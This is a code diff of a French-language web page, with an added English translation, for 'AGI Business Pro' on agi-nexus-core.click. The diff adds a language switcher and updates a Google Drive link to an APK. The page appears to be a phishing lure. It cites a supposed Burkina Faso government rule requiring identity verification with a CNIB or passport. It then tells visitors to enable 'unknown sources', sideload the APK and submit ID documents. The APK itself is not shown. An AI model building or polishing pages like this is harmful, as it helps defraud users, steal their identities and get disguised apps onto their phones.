@@ -1,10 +1,10 @@
 <!DOCTYPE html>
-<html lang="fr">
+<html lang="fr" id="html-lang">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <meta name="description" content="Téléchargement de la mise à jour AGI Business Pro">
-    <title>Télécharger AGI Business Pro - Mise à jour</title>
+    <title id="t-page-title">Télécharger AGI Business Pro - Mise à jour</title>
     <style>
         :root {
             /* Thème Ciel Clair */
@@ -33,7 +33,36 @@
         .container { 
             max-width: 600px; 
             margin: 0 auto; 
-            padding: 40px 20px; 
+            padding: 30px 20px 40px 20px; 
+        }
+
+        /* Styles du sélecteur de langue */
+        .lang-switcher {
+            display: flex;
+            justify-content: flex-end;
+            gap: 8px;
+            margin-bottom: 20px;
+        }
+
+        .lang-btn {
+            background-color: var(--card-bg);
+            border: 1px solid var(--btn-blue);
+            color: var(--btn-blue);
+            padding: 5px 12px;
+            border-radius: 6px;
+            cursor: pointer;
+            font-weight: bold;
+            font-size: 0.9em;
+            transition: all 0.2s ease;
+        }
+
+        .lang-btn:hover {
+            background-color: #bae6fd;
+        }
+
+        .lang-btn.active {
+            background-color: var(--btn-blue);
+            color: white;
         }
         
         .header {
@@ -55,8 +84,8 @@
             height: 50px;
             width: auto;
             object-fit: contain;
-            border-radius: 8px; /* Ajoute des bords légèrement arrondis */
-            box-shadow: 0 2px 4px rgba(0,0,0,0.1); /* Petite ombre pour faire ressortir le logo */
+            border-radius: 8px;
+            box-shadow: 0 2px 4px rgba(0,0,0,0.1);
         }
         
         .sub-logo {
@@ -105,27 +134,40 @@
         
         .download-btn { 
             display: inline-flex; 
+            flex-direction: column;
             align-items: center;
             justify-content: center;
-            gap: 10px;
+            gap: 4px;
             background-color: var(--btn-blue); 
             color: white; 
             text-decoration: none; 
-            padding: 18px 30px; 
-            font-size: 1.2em; 
-            font-weight: bold; 
+            padding: 15px 30px; 
             border-radius: 50px; 
             transition: all 0.3s ease; 
             box-shadow: 0 4px 6px rgba(14, 165, 233, 0.3); 
             width: 80%;
             max-width: 400px;
-            margin: 20px 0;
+            margin: 20px auto;
         }
         
         .download-btn:hover { 
             background-color: var(--btn-hover); 
             transform: translateY(-2px);
             box-shadow: 0 6px 12px rgba(2, 132, 199, 0.4);
+        }
+
+        .btn-main {
+            display: flex;
+            align-items: center;
+            gap: 10px;
+            font-size: 1.2em; 
+            font-weight: bold; 
+        }
+
+        .btn-size {
+            font-size: 0.85em;
+            font-weight: 500;
+            opacity: 0.9;
         }
         
         .instructions { 
@@ -165,6 +207,12 @@
 </head>
 <body>
     <div class="container">
+        <!-- Sélecteur de langue -->
+        <div class="lang-switcher">
+            <button class="lang-btn active" id="btn-fr" onclick="setLang('fr')">FR</button>
+            <button class="lang-btn" id="btn-en" onclick="setLang('en')">EN</button>
+        </div>
+
         <div class="header">
             <div class="logo-text">
                 <img src="https://i.imgur.com/NyWnYFN.jpeg" alt="Logo AGI" class="company-logo">
@@ -173,42 +221,113 @@
             <div class="sub-logo">Atlas Group International</div>
         </div>
 
-        <h1>Mise à jour d'AGI Business Pro</h1>
+        <h1 id="t-title">Mise à jour d'AGI Business Pro</h1>
 
-        <div class="alert-box">
+        <div class="alert-box" id="t-alert">
             <strong>⚠️ Action Requise :</strong> Conformément à la réglementation gouvernementale du Burkina Faso, une vérification d'identité complète (CNIB ou Passeport) est désormais obligatoire pour continuer à utiliser nos services.
         </div>
 
         <div class="info-card">
-            <h3>Détails de la version</h3>
-            <p>Cette nouvelle version intègre les normes de sécurité requises par l'État pour garantir la protection de vos opérations et la conformité de notre écosystème.</p>
-            <p><strong>Note :</strong> Ce portail sécurisé est conçu exclusivement pour faciliter le téléchargement direct de l'application via votre navigateur Chrome.</p>
+            <h3 id="t-version-title">Détails de la version</h3>
+            <p id="t-version-desc1">Cette nouvelle version intègre les normes de sécurité requises par l'État pour garantir la protection de vos opérations et la conformité de notre écosystème.</p>
+            <p id="t-version-desc2"><strong>Note :</strong> Ce portail sécurisé est conçu exclusivement pour faciliter le téléchargement direct de l'application via votre navigateur Chrome.</p>
         </div>
 
-        <a href="https://drive.google.com/uc?export=download&id=1YjLXDTrTZxPh7SR5x9LJJHsgnQf4Jl3q" class="download-btn" target="_blank" rel="noopener noreferrer">
-            <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
-                <path d="M21 15v4a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2v-4"></path>
-                <polyline points="7 10 12 15 17 10"></polyline>
-                <line x1="12" y1="15" x2="12" y2="3"></line>
-            </svg>
-            Télécharger l'APK
+        <!-- Le lien Google Drive direct a été mis à jour -->
+        <a href="https://drive.google.com/uc?export=download&id=1YVWgeH0K7vT8izjgAXIV85eFctbrPtQr" class="download-btn" target="_blank" rel="noopener noreferrer">
+            <div class="btn-main">
+                <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+                    <path d="M21 15v4a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2v-4"></path>
+                    <polyline points="7 10 12 15 17 10"></polyline>
+                    <line x1="12" y1="15" x2="12" y2="3"></line>
+                </svg>
+                <span id="t-download-btn">Télécharger l'APK</span>
+            </div>
+            <!-- Taille de l'APK ajoutée ici -->
+            <div class="btn-size" id="t-download-size">Taille : 30.01 Mo</div>
         </a>
 
         <div class="instructions">
-            <h3>Guide d'installation</h3>
+            <h3 id="t-guide-title">Guide d'installation</h3>
             <ol>
-                <li>Cliquez sur le bouton <strong>Télécharger l'APK</strong> ci-dessus.</li>
-                <li>Une fois le téléchargement terminé dans Chrome, ouvrez le fichier depuis vos notifications ou votre dossier <em>Téléchargements</em>.</li>
-                <li>Si votre smartphone affiche un message concernant l'installation à partir de <strong>"Sources inconnues"</strong>, allez dans vos paramètres et autorisez l'installation depuis Chrome.</li>
-                <li>Installez la mise à jour et ouvrez l'application.</li>
-                <li>Suivez le processus de vérification d'identité à l'écran.</li>
+                <li id="t-step1">Cliquez sur le bouton <strong>Télécharger l'APK</strong> ci-dessus.</li>
+                <li id="t-step2">Une fois le téléchargement terminé dans Chrome, ouvrez le fichier depuis vos notifications ou votre dossier <em>Téléchargements</em>.</li>
+                <li id="t-step3">Si votre smartphone affiche un message concernant l'installation à partir de <strong>"Sources inconnues"</strong>, allez dans vos paramètres et autorisez l'installation depuis Chrome.</li>
+                <li id="t-step4">Installez la mise à jour et ouvrez l'application.</li>
+                <li id="t-step5">Suivez le processus de vérification d'identité à l'écran.</li>
             </ol>
         </div>
 
-        <div class="footer">
+        <div class="footer" id="t-footer">
             &copy; 2026 Atlas Group International.<br>
             agi-nexus-core.click | Sécurisé et Conforme
         </div>
     </div>
+
+    <!-- Script de gestion des langues -->
+    <script>
+        const translations = {
+            fr: {
+                pageTitle: "Télécharger AGI Business Pro - Mise à jour",
+                title: "Mise à jour d'AGI Business Pro",
+                alert: "<strong>⚠️ Action Requise :</strong> Conformément à la réglementation gouvernementale du Burkina Faso, une vérification d'identité complète (CNIB ou Passeport) est désormais obligatoire pour continuer à utiliser nos services.",
+                versionTitle: "Détails de la version",
+                versionDesc1: "Cette nouvelle version intègre les normes de sécurité requises par l'État pour garantir la protection de vos opérations et la conformité de notre écosystème.",
+                versionDesc2: "<strong>Note :</strong> Ce portail sécurisé est conçu exclusivement pour faciliter le téléchargement direct de l'application via votre navigateur Chrome.",
+                downloadBtn: "Télécharger l'APK",
+                downloadSize: "Taille : 30.01 Mo",
+                guideTitle: "Guide d'installation",
+                step1: "Cliquez sur le bouton <strong>Télécharger l'APK</strong> ci-dessus.",
+                step2: "Une fois le téléchargement terminé dans Chrome, ouvrez le fichier depuis vos notifications ou votre dossier <em>Téléchargements</em>.",
+                step3: "Si votre smartphone affiche un message concernant l'installation à partir de <strong>\"Sources inconnues\"</strong>, allez dans vos paramètres et autorisez l'installation depuis Chrome.",
+                step4: "Installez la mise à jour et ouvrez l'application.",
+                step5: "Suivez le processus de vérification d'identité à l'écran.",
+                footer: "&copy; 2026 Atlas Group International.<br>agi-nexus-core.click | Sécurisé et Conforme"
+            },
+            en: {
+                pageTitle: "Download AGI Business Pro - Update",
+                title: "AGI Business Pro Update",
+                alert: "<strong>⚠️ Action Required:</strong> In accordance with Burkina Faso government regulations, complete identity verification (CNIB or Passport) is now mandatory to continue using our services.",
+                versionTitle: "Version Details",
+                versionDesc1: "This new version integrates state-required security standards to ensure the protection of your operations and the compliance of our ecosystem.",
+                versionDesc2: "<strong>Note:</strong> This secure portal is exclusively designed to facilitate the direct download of the application via your Chrome browser.",
+                downloadBtn: "Download APK",
+                downloadSize: "Size: 30.01 MB",
+                guideTitle: "Installation Guide",
+                step1: "Click the <strong>Download APK</strong> button above.",
+                step2: "Once the download is complete in Chrome, open the file from your notifications or your <em>Downloads</em> folder.",
+                step3: "If your smartphone displays a message about installing from <strong>\"Unknown sources\"</strong>, go to your settings and allow installation from Chrome.",
+                step4: "Install the update and open the application.",
+                step5: "Follow the identity verification process on the screen.",
+                footer: "&copy; 2026 Atlas Group International.<br>agi-nexus-core.click | Secure and Compliant"
+            }
+        };
+
+        function setLang(lang) {
+            // Changement de l'attribut lang de la page HTML
+            document.getElementById('html-lang').setAttribute('lang', lang);
+
+            // Mise à jour du texte
+            document.getElementById('t-page-title').innerHTML = translations[lang].pageTitle;
+            document.getElementById('t-title').innerHTML = translations[lang].title;
+            document.getElementById('t-alert').innerHTML = translations[lang].alert;
+            document.getElementById('t-version-title').innerHTML = translations[lang].versionTitle;
+            document.getElementById('t-version-desc1').innerHTML = translations[lang].versionDesc1;
+            document.getElementById('t-version-desc2').innerHTML = translations[lang].versionDesc2;
+            document.getElementById('t-download-btn').innerHTML = translations[lang].downloadBtn;
+            document.getElementById('t-download-size').innerHTML = translations[lang].downloadSize;
+            document.getElementById('t-guide-title').innerHTML = translations[lang].guideTitle;
+            document.getElementById('t-step1').innerHTML = translations[lang].step1;
+            document.getElementById('t-step2').innerHTML = translations[lang].step2;
+            document.getElementById('t-step3').innerHTML = translations[lang].step3;
+            document.getElementById('t-step4').innerHTML = translations[lang].step4;
+            document.getElementById('t-step5').innerHTML = translations[lang].step5;
+            document.getElementById('t-footer').innerHTML = translations[lang].footer;
+            
+            // Mise à jour de l'état des boutons de sélection
+            document.getElementById('btn-fr').classList.toggle('active', lang === 'fr');
+            document.getElementById('btn-en').classList.toggle('active', lang === 'en');
+        }
+    </script>
 </body>
 </html>
